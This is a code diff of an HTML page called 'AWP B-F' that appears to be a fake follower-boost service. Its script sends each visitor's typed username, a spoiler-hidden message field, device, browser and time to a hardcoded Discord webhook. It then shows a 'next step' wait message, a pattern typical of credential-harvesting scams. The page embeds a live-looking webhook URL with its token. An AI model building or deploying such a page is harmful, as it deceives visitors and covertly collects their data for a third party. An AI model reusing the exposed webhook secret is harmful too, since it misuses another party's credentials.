@@ -24,7 +24,6 @@
             position: relative;
         }
 
-        /* Subtle glowing background aura */
         body::before {
             content: '';
             position: absolute;
@@ -153,16 +152,6 @@
             font-size: 13px;
             line-height: 1.5;
         }
-
-        /* Success state styling when triggered */
-        .success-box {
-            animation: fadeIn 0.4s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.97); }
-            to { opacity: 1; transform: scale(1); }
-        }
     </style>
 </head>
 
@@ -172,12 +161,7 @@
 
     <h1>AWP B-F</h1>
 
-    <form
-        id="webhookForm"
-        target="webhookFrame"
-        method="POST"
-        enctype="multipart/form-data"
-    >
+    <form id="webhookForm">
 
         <div class="input-group">
             <label for="username">Username</label>
@@ -218,248 +202,103 @@
 
     </form>
 
-    <iframe
-        name="webhookFrame"
-        style="display:none"
-    ></iframe>
-
     <div id="status"></div>
 
 </div>
 
 <script>
+// REPLACE WITH YOUR DISCORD WEBHOOK URL
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1555317187177226412/8vXAuept6gC42GSKCs5QZ_8WbvGbSe6MxhJW8jTYjt_Vh0dkS6WZxpot7Cuft2fl7kjO";
 
-const WEBHOOK_URL =
-    "https://discordapp.com/api/webhooks/1555317187177226412/8vXAuept6gC42GSKCs5QZ_8WbvGbSe6MxhJW8jTYjt_Vh0dkS6WZxpot7Cuft2fl7kjO";
+const form = document.getElementById("webhookForm");
+const username = document.getElementById("username");
+const message = document.getElementById("message");
+const followers = document.getElementById("followers");
+const button = document.getElementById("submitButton");
+const status = document.getElementById("status");
 
-
-const form =
-    document.getElementById("webhookForm");
-
-const username =
-    document.getElementById("username");
-
-const message =
-    document.getElementById("message");
-
-const followers =
-    document.getElementById("followers");
-
-const button =
-    document.getElementById("submitButton");
-
-const status =
-    document.getElementById("status");
-
-
-form.addEventListener("submit", function(event) {
-
+form.addEventListener("submit", async function(event) {
     event.preventDefault();
 
-    const user =
-        username.value.trim();
-
-    const msg =
-        message.value.trim();
-
-    const amount =
-        Number(followers.value);
-
+    const user = username.value.trim();
+    const msg = message.value.trim();
+    const amount = Number(followers.value);
 
     if (!user || !msg) {
-        status.textContent =
-            "Fill in all fields.";
+        status.textContent = "Fill in all fields.";
         return;
     }
 
-
-    if (
-        amount < 1 ||
-        amount > 10000
-    ) {
-        status.textContent =
-            "Followers must be between 1 and 10,000.";
+    if (amount < 1 || amount > 10000) {
+        status.textContent = "Followers must be between 1 and 10,000.";
         return;
     }
 
-
-    /*
-        Build Discord webhook payload.
-    */
+    if (msg.length > 4000) {
+        status.textContent = "Message cannot exceed 4,000 characters (Discord limit).";
+        return;
+    }
 
     const payload = {
-
         username: "AWP B-F",
-
         embeds: [
-
             {
-
                 title: "New AWP B-F Request",
-
                 color: 16777215,
-
                 fields: [
-
-                    {
-                        name: "Username",
-                        value: user,
-                        inline: true
+                    { name: "Username", value: user, inline: true },
+                    { name: "Followers", value: String(amount), inline: true },
+                    { 
+                        name: "Device", 
+                        value: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Mobile" : "PC", 
+                        inline: true 
                     },
-
-                    {
-                        name: "Followers",
-                        value: String(amount),
-                        inline: true
-                    },
-
-                    {
-                        name: "Device",
-                        value:
-                            /Mobi|Android|iPhone|iPad/i.test(
-                                navigator.userAgent
-                            )
-                            ? "Mobile"
-                            : "PC",
-                        inline: true
-                    },
-
-                    {
-                        name: "Browser",
-                        value: getBrowser(),
-                        inline: true
-                    },
-
-                    {
-                        name: "Date / Time",
-                        value:
-                            new Date().toLocaleString(),
-                        inline: false
-                    }
-
+                    { name: "Browser", value: getBrowser(), inline: true },
+                    { name: "Date / Time", value: new Date().toLocaleString(), inline: false }
                 ],
-
-                description:
-                    "**Message:**\n||" +
-                    msg +
-                    "||",
-
-                footer: {
-                    text: "AWP B-F"
-                },
-
-                timestamp:
-                    new Date().toISOString()
-
+                description: "**Message:**\n||" + msg + "||",
+                footer: { text: "AWP B-F" },
+                timestamp: new Date().toISOString()
             }
-
         ]
-
     };
 
-
-    /*
-        Create a temporary form specifically
-        for Discord's webhook endpoint.
-    */
-
-    const discordForm =
-        document.createElement("form");
-
-    discordForm.method = "POST";
-
-    discordForm.action =
-        WEBHOOK_URL;
-
-    discordForm.target =
-        "webhookFrame";
-
-    discordForm.enctype =
-        "multipart/form-data";
-
-
-    const payloadInput =
-        document.createElement("input");
-
-    payloadInput.type = "hidden";
-
-    payloadInput.name =
-        "payload_json";
-
-    payloadInput.value =
-        JSON.stringify(payload);
-
-
-    discordForm.appendChild(
-        payloadInput
-    );
-
-    document.body.appendChild(
-        discordForm
-    );
-
-
     button.disabled = true;
+    button.textContent = "Sending...";
+    status.textContent = "Submitting request...";
 
-    button.textContent =
-        "Sending...";
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
 
-    status.textContent =
-        "Submitting request...";
-
-
-    discordForm.submit();
-
-
-    /*
-        We can't read Discord's response because
-        this is a cross-origin form submission.
-
-        Wait briefly, then show the next screen.
-    */
-
-    setTimeout(() => {
-
-        discordForm.remove();
-
-        form.style.display =
-            "none";
-
-        status.innerHTML =
-            "✓ Request submitted.<br><br>" +
-            "Please allow 10 or more minutes for the next step.";
-
-    }, 1500);
-
+        if (response.ok || response.status === 204) {
+            form.style.display = "none";
+            status.innerHTML = "✓ Request submitted.<br><br>Please allow 10 or more minutes for the next step.";
+        } else {
+            throw new Error(`Server responded with status ${response.status}`);
+        }
+    } catch (error) {
+        console.error(error);
+        status.textContent = "Failed to send request. Check your Webhook URL.";
+        button.disabled = false;
+        button.textContent = "Submit Request";
+    }
 });
 
-
 function getBrowser() {
-
-    const ua =
-        navigator.userAgent;
-
-    if (ua.includes("Edg/"))
-        return "Microsoft Edge";
-
-    if (ua.includes("OPR/"))
-        return "Opera";
-
-    if (ua.includes("Chrome/"))
-        return "Google Chrome";
-
-    if (ua.includes("Firefox/"))
-        return "Firefox";
-
-    if (
-        ua.includes("Safari/") &&
-        !ua.includes("Chrome/")
-    )
-        return "Safari";
-
+    const ua = navigator.userAgent;
+    if (ua.includes("Edg/")) return "Microsoft Edge";
+    if (ua.includes("OPR/")) return "Opera";
+    if (ua.includes("Chrome/")) return "Google Chrome";
+    if (ua.includes("Firefox/")) return "Firefox";
+    if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
     return "Unknown";
 }
-
 </script>
 
 </body>
